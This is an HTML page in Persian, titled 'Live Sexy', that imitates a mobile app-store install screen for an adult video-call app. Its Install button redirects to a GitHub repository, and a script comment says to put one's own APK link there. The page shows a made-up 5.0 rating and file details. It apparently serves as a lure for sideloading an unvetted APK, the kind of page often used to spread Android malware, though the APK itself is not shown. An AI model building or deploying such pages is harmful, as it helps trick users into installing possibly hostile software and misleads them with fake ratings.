<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لایو سکسی</title>
    <style>
        body {
            background-color: #121212;
            color: white;
            font-family: Tahoma, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 400px;
            background: #1e1e1e;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }
        .status-bar {
            display: flex;
            justify-content: space-between;
            padding: 8px 15px;
            font-size: 12px;
            background: #000;
            color: #fff;
        }
        .header {
            background: #1976d2;
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .content {
            padding: 20px;
            text-align: center;
        }
        .icon {
            width: 100px;
            height: 100px;
            border-radius: 20px;
            object-fit: cover;
            margin-bottom: 15px;
            border: 2px solid #333;
        }
        h1 { margin: 0; font-size: 24px; }
        .sub { color: #aaa; font-size: 14px; margin-bottom: 20px; }
        .btn {
            background: #1976d2;
            color: white;
            border: none;
            width: 100%;
            padding: 15px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        .info-box {
            background: #2c2c2c;
            padding: 15px;
            border-radius: 10px;
            text-align: right;
            font-size: 14px;
        }
        .row { display: flex; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px solid #444; padding-bottom: 5px;}
        .nav { height: 40px; background: #000; display: flex; justify-content: space-around; align-items: center; }
    </style>
</head>
<body>

<div class="container">
    <!-- نوار وضعیت -->
    <div class="status-bar">
        <span>12:55</span>
        <span>📶 4G 🔋 90%</span>
    </div>
    
    <!-- هدر -->
    <div class="header">
        <span>✕</span>
        <span>لایو سکسی</span>
        <span>⋮</span>
    </div>

    <div class="content">
        <!-- عکس آیکون -->
        <img src="https://raw.githubusercontent.com/a76140436poco-dev/file/main/icon.png" class="icon" alt="Icon">
        
        <h1>لایو سکسی</h1>
        <p class="sub">تماس تصویری، ساده و رایگان</p>

        <!-- دکمه دانلود -->
        <button class="btn" onclick="downloadApp()">نصب</button>

        <!-- مشخصات -->
        <div class="info-box">
            <div class="row"><span>نسخه</span><span>۱.۰</span></div>
            <div class="row"><span>امتیاز</span><span>۵.۰</span></div>
            <div class="row"><span>حجم</span><span>۳MB</span></div>
        </div>
    </div>

    <div class="nav">
        <span>≡</span><span>●</span><span>◀</span>
    </div>
</div>

<script>
    function downloadApp() {
        // لینک RAW فایل APK خودت رو اینجا بذار
        var apkLink = 'https://github.com/a76140436poco-dev/file.git'; 
        window.location.href = apkLink;
    }
</script>

</body>
</html>
